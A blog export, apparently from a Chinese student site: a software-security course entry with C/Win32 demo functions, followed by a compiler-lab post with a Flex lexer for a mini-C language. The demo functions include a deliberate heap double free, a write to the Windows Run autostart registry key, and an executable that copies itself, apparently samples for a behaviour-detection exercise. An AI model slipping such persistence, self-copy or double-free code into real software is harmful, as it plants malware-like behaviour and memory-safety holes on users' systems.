class="line">	 filehandle = <span class="built_in">CreateFile</span>(<span class="string">L&quot;.\\TempFile\\007.txt&quot;</span>, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, <span class="literal">NULL</span>, CREATE_ALWAYS, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	CHAR* pBuffer;</span><br><span class="line">	<span class="keyword">int</span> fileSize = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">bool</span> flag;</span><br><span class="line">	<span class="keyword">if</span> (filehandle == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		filehandle = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;打开文件失败！\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;成功打开文件！\n&quot;</span>);</span><br><span class="line">	fileSize = <span class="built_in">GetFileSize</span>(filehandle, <span class="literal">NULL</span>);</span><br><span class="line">	pBuffer = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>((fileSize + <span class="number">1</span>) * <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">char</span>));</span><br><span class="line">	flag = <span class="built_in">ReadFile</span>(filehandle, pBuffer, fileSize, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	pBuffer[fileSize] = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (flag) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;成功读取字符串!\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">free</span>(pBuffer);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(filehandle);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">HeapCreateAndFree</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;按下任意键创建堆！\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">	HANDLE hHeap = <span class="built_in">HeapCreate</span>(HEAP_NO_SERIALIZE, PAGE_SIZE * <span class="number">10</span>, PAGE_SIZE * <span class="number">100</span>);</span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">	<span class="keyword">int</span>* pArr = (<span class="keyword">int</span>*)<span class="built_in">HeapAlloc</span>(hHeap, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">int</span>) * <span class="number">30</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;堆创建成功！\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;按下任意键释放堆！\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">	<span class="built_in">HeapFree</span>(hHeap, <span class="number">0</span>, pArr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;堆释放成功！\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;按下任意键销毁堆！\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">	<span class="built_in">HeapDestroy</span>(hHeap);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;堆销毁成功！\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">HeapRepeadFree</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;按下任意键开始重复创建堆！\n&quot;</span>);</span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">	HANDLE hHeap = <span class="built_in">HeapCreate</span>(HEAP_NO_SERIALIZE, PAGE_SIZE * <span class="number">10</span>, PAGE_SIZE * <span class="number">100</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span>* pArr = (<span class="keyword">int</span>*)<span class="built_in">HeapAlloc</span>(hHeap, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">int</span>) * <span class="number">30</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">30</span>; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		pArr[i] = i + <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;堆创建成功！\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;开始第一次释放堆！\n&quot;</span>);</span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">	<span class="built_in">HeapFree</span>(hHeap, <span class="number">0</span>, pArr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;开始第二次释放堆！\n&quot;</span>);</span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">	<span class="built_in">HeapFree</span>(hHeap, <span class="number">0</span>, pArr);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;按任意键销毁堆！\n&quot;</span>);</span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">	<span class="built_in">HeapDestroy</span>(hHeap);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RegCreateAndSet</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 创建注册表并设置键值</span></span><br><span class="line">	HKEY hKey = <span class="literal">NULL</span>;</span><br><span class="line">	TCHAR Data[<span class="number">254</span>];</span><br><span class="line">	<span class="built_in">memset</span>(Data, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(Data));</span><br><span class="line">	<span class="built_in">wcsncpy_s</span>(Data, <span class="built_in">TEXT</span>(<span class="string">&quot;https://www.baidu.com&quot;</span>), <span class="number">254</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">size_t</span> lRet = <span class="built_in">RegCreateKeyEx</span>(HKEY_CURRENT_USER, (LPWSTR)<span class="string">L&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Run\MyRegKey&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>, REG_OPTION_NON_VOLATILE,</span><br><span class="line">		KEY_ALL_ACCESS, <span class="literal">NULL</span>, &amp;hKey, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (lRet == ERROR_SUCCESS) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;注册表自启动键创建成功！\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;注册表自启动键创建失败！\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 修改注册表键值，没有则创建它</span></span><br><span class="line">	<span class="keyword">size_t</span> iLen = <span class="built_in">wcslen</span>(Data);</span><br><span class="line">	<span class="comment">// 设置键值</span></span><br><span class="line">	lRet = <span class="built_in">RegSetValueEx</span>(hKey, <span class="string">L&quot;Changpeng&quot;</span>, <span class="number">0</span>, REG_SZ, (CONST BYTE*)Data, <span class="built_in"><span class="keyword">sizeof</span></span>(TCHAR) * iLen);</span><br><span class="line">	<span class="keyword">if</span> (lRet == ERROR_SUCCESS)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;注册键修改值成功！\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;修改注册键值失败！\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;按任意键关闭注册键！\n&quot;</span>);</span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">	<span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;按任意键再次打开注册键！\n&quot;</span>);</span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">	lRet = <span class="built_in">RegOpenKeyEx</span>(HKEY_CURRENT_USER, (LPWSTR)<span class="string">L&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Run\MyRegKey&quot;</span>, <span class="number">0</span>, KEY_ALL_ACCESS, &amp;hKey);</span><br><span class="line">	<span class="keyword">if</span> (lRet == ERROR_SUCCESS) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;注册键打开成功！\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;注册键打开失败！\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;按任意键删除键值！\n&quot;</span>);</span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">	lRet = <span class="built_in">RegDeleteValue</span>(hKey, <span class="string">L&quot;Changpeng&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (lRet == ERROR_SUCCESS) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;注册键删除成功！\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;注册键删除失败！\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SendSocket</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//初始化 DLL</span></span><br><span class="line">	WSADATA wsaData;</span><br><span class="line">	<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line">	<span class="comment">//创建套接字</span></span><br><span class="line">	SOCKET servSock = <span class="built_in">socket</span>(PF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">	<span class="comment">//绑定套接字</span></span><br><span class="line">	sockaddr_in sockAddr;</span><br><span class="line">	<span class="built_in">memset</span>(&amp;sockAddr, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(sockAddr));  <span class="comment">//每个字节都用0填充</span></span><br><span class="line">	sockAddr.sin_family = PF_INET;  <span class="comment">//使用IPv4地址</span></span><br><span class="line">	sockAddr.sin_addr.s_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>);  <span class="comment">//具体的IP地址</span></span><br><span class="line">	sockAddr.sin_port = <span class="built_in">htons</span>(<span class="number">8888</span>);  <span class="comment">//端口</span></span><br><span class="line">	<span class="built_in">bind</span>(servSock, (SOCKADDR*)&amp;sockAddr, <span class="built_in"><span class="keyword">sizeof</span></span>(SOCKADDR));</span><br><span class="line">	<span class="comment">//进入监听状态</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;正在等待连接......\n&quot;</span>);</span><br><span class="line">	<span class="built_in">listen</span>(servSock, <span class="number">20</span>);</span><br><span class="line">	<span class="comment">//接收客户端请求</span></span><br><span class="line">	SOCKADDR clntAddr;</span><br><span class="line">	<span class="keyword">int</span> nSize = <span class="built_in"><span class="keyword">sizeof</span></span>(SOCKADDR);</span><br><span class="line">	SOCKET clntSock = <span class="built_in">accept</span>(servSock, (SOCKADDR*)&amp;clntAddr, &amp;nSize);</span><br><span class="line">	<span class="comment">//向客户端发送数据</span></span><br><span class="line">	<span class="keyword">char</span> str[<span class="number">32</span>] = <span class="string">&quot;你好，我是发送端！&quot;</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;正在发送数据......\n&quot;</span>);</span><br><span class="line">	<span class="built_in">send</span>(clntSock, str, <span class="built_in">strlen</span>(str) + <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">char</span>), <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;成功发送数据！\n&quot;</span>);</span><br><span class="line">	<span class="comment">//关闭套接字</span></span><br><span class="line">	<span class="built_in">closesocket</span>(clntSock);</span><br><span class="line">	<span class="built_in">closesocket</span>(servSock);</span><br><span class="line">	<span class="comment">//终止 DLL 的使用</span></span><br><span class="line">	<span class="built_in">WSACleanup</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RecvSocket</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//初始化DLL</span></span><br><span class="line">	WSADATA wsaData;</span><br><span class="line">	<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line">	<span class="comment">//创建套接字</span></span><br><span class="line">	SOCKET sock = <span class="built_in">socket</span>(PF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">	<span class="comment">//向服务器发起请求</span></span><br><span class="line">	sockaddr_in sockAddr;</span><br><span class="line">	<span class="built_in">memset</span>(&amp;sockAddr, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(sockAddr));  <span class="comment">//每个字节都用0填充</span></span><br><span class="line">	sockAddr.sin_family = PF_INET;</span><br><span class="line">	sockAddr.sin_addr.s_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">	sockAddr.sin_port = <span class="built_in">htons</span>(<span class="number">8888</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;正在尝试连接......\n&quot;</span>);</span><br><span class="line">	<span class="built_in">connect</span>(sock, (SOCKADDR*)&amp;sockAddr, <span class="built_in"><span class="keyword">sizeof</span></span>(SOCKADDR));</span><br><span class="line">	<span class="built_in">Sleep</span>(<span class="number">500</span>);</span><br><span class="line">	<span class="comment">//接收服务器传回的数据</span></span><br><span class="line">	<span class="keyword">char</span> szBuffer[MAXBYTE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;正在接受数据......\n&quot;</span>);</span><br><span class="line">	<span class="built_in">recv</span>(sock, szBuffer, MAXBYTE, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">//输出接收到的数据</span></span><br><span class="line">	<span class="keyword">if</span> (szBuffer[<span class="number">0</span>] != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;成功收到数据： %s\n&quot;</span>, szBuffer);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;接受数据失败！\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//关闭套接字</span></span><br><span class="line">	<span class="built_in">closesocket</span>(sock);</span><br><span class="line">	<span class="comment">//终止使用 DLL</span></span><br><span class="line">	<span class="built_in">WSACleanup</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SelfCopy</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> path[MAX_PATH];</span><br><span class="line">	<span class="built_in">memset</span>(path, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(path));</span><br><span class="line">	<span class="built_in">GetModuleFileNameA</span>(<span class="literal">NULL</span>, path, <span class="built_in"><span class="keyword">sizeof</span></span>(path));<span class="comment">//获得文件路径</span></span><br><span class="line">	<span class="keyword">char</span> des[<span class="number">50</span>] = <span class="string">&quot;./copyfile.exe&quot;</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">CopyFileA</span>(path, des, <span class="literal">true</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">getchar</span>();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;自我复制成功！\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;自我复制失败！\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>课程设计</category>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>软件安全</tag>
        <tag>课程设计</tag>
      </tags>
  </entry>
  <entry>
    <title>编译原理实验:Weeek2</title>
    <url>/2021/11/04/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AE%9E%E9%AA%8C-Week2/</url>
    <content><![CDATA[<hr />
<div class="note orange icon simple"><i class="note-icon fas fa-battery-half"></i><p>这里贴出来对第二周实验的代码记录，仅做个人记录所用。</p>
</div>
<hr />
<h4 id="第一关flex-minic词法分析一"><a class="markdownIt-Anchor" href="#第一关flex-minic词法分析一"></a> 第一关：Flex minic词法分析（一）</h4>
<p>这一关需要注意的是在编写非法字符的规则时，原先给出的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>f</mi><mi>l</mi><mi>e</mi><mi>x</mi><mi>o</mi><mi>u</mi><mi>t</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;flexout\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord mathdefault">x</span><span class="mord mathdefault">o</span><span class="mord mathdefault">u</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>函数不再适用，这里可以根据<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>p</mi><mi>r</mi><mi>i</mi><mi>n</mi><mi>t</mi><mi>f</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;printf\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>函数进行输出，行号可以由<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>y</mi><mi>y</mi><mi>l</mi><mi>i</mi><mi>n</mi><mi>e</mi><mi>n</mi><mi>o</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;yylineno\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mord mathdefault">o</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>得出，文本使用之前实验中的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>y</mi><mi>y</mi><mi>t</mi><mi>e</mi><mi>x</mi><mi>t</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;yytext\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.19444em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">x</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;string.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;def.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> yycolumn;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> YYSTYPE yylval</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">yywrap</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">yylex</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">flexout</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> name,<span class="built_in">std</span>::<span class="built_in">string</span> value)</span></span>&#123;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;name&lt;&lt;<span class="string">&quot;\t:&quot;</span>&lt;&lt;value&lt;&lt;<span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//flex为bison提供行号信息</span></span><br><span class="line">%&#125;</span><br><span class="line">%option yylineno</span><br><span class="line">ID [A-Za-z]*</span><br><span class="line">INT [<span class="number">0</span><span class="number">-7</span>]+</span><br><span class="line"><span class="comment">//非法字符</span></span><br><span class="line">ERRORTYPE <span class="string">&quot;~&quot;</span></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;int&quot;</span>        &#123;flexout(<span class="string">&quot;TYPE&quot;</span>,<span class="string">&quot;int&quot;</span>);&#125;</span><br><span class="line"><span class="string">&quot;float&quot;</span>      &#123;flexout(<span class="string">&quot;TYPE&quot;</span>,<span class="string">&quot;float&quot;</span>);&#125;</span><br><span class="line"><span class="string">&quot;char&quot;</span>      &#123;flexout(<span class="string">&quot;TYPE&quot;</span>,<span class="string">&quot;char&quot;</span>);&#125;</span><br><span class="line">&#123;INT&#125;   &#123;flexout(<span class="string">&quot;INT&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;ID&#125;    &#123;flexout(<span class="string">&quot;ID&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;ERRORTYPE&#125;  &#123;<span class="built_in">printf</span>(<span class="string">&quot;Error type A at Line %d: Mysterious characters &#x27;%s&#x27;\n&quot;</span>,yylineno,yytext);&#125;</span><br><span class="line"><span class="string">&quot;;&quot;</span>  &#123;flexout(<span class="string">&quot;SEMI&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;,&quot;</span>  &#123;flexout(<span class="string">&quot;COMMA&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;=&quot;</span>  &#123;flexout(<span class="string">&quot;ASSIGNOP&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;+&quot;</span>  &#123;flexout(<span class="string">&quot;PLUS&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;-&quot;</span>  &#123;flexout(<span class="string">&quot;MINUS&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;*&quot;</span>  &#123;flexout(<span class="string">&quot;STAR&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;/&quot;</span>  &#123;flexout(<span class="string">&quot;DIV&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;&amp;&quot;</span> &#123;flexout(<span class="string">&quot;AND&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;|&quot;</span>  &#123;flexout(<span class="string">&quot;OR&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;.&quot;</span>  &#123;flexout(<span class="string">&quot;DOT&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;!&quot;</span>  &#123;flexout(<span class="string">&quot;NOT&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;(&quot;</span>  &#123;flexout(<span class="string">&quot;LP&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;)&quot;</span>  &#123;flexout(<span class="string">&quot;RP&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;[&quot;</span>  &#123;flexout(<span class="string">&quot;LB&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;]&quot;</span>  &#123;flexout(<span class="string">&quot;RB&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;&#123;&quot;</span>  &#123;flexout(<span class="string">&quot;LC&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;&#125;&quot;</span>  &#123;flexout(<span class="string">&quot;RC&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;struct&quot;</span>  &#123;flexout(<span class="string">&quot;STRUCT&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;return&quot;</span>  &#123;flexout(<span class="string">&quot;RETURN&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;if&quot;</span>  &#123;flexout(<span class="string">&quot;IF&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;else&quot;</span>  &#123;flexout(<span class="string">&quot;ELSE&quot;</span>,yytext);&#125;</span><br><span class="line"><span class="string">&quot;while&quot;</span>  &#123;flexout(<span class="string">&quot;WHILE&quot;</span>,yytext);&#125;</span><br><span class="line"></span><br><span class="line">[\n]		&#123;yycolumn=<span class="number">1</span>;&#125;</span><br><span class="line">[ \r\t]		&#123;<span class="comment">/*printf(&quot;过滤空格等字符\n&quot;);*/</span>&#125;</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yywrap</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="第二关flex-minic词法分析二"><a class="markdownIt-Anchor" href="#第二关flex-minic词法分析二"></a> 第二关：Flex minic词法分析（二）</h4>
<p>注意这次实验中的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>I</mi><mi>N</mi><mi>T</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;INT\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>类型只包括八进制和十六进制，只有<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>f</mi><mi>l</mi><mi>o</mi><mi>a</mi><mi>t</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;float\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>是十进制，著名惨案是发现样例中将“0123”定义为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>I</mi><mi>N</mi><mi>T</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;INT\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>类型，而“09”则不是。而关于浮点数的规则，这里使用文档中对于浮点数的定义即采用科学计数法，浮点数分为简单的（如1.05之类的）和使用科学计数法的（如1.05e+10之类的），后面必须加或者减一个整数，著名惨案是样例中有个“1.05e”不是浮点数。</p>
<p>另外，不要在代码中添加注释，会编译不通过，血的教训！！！</p>
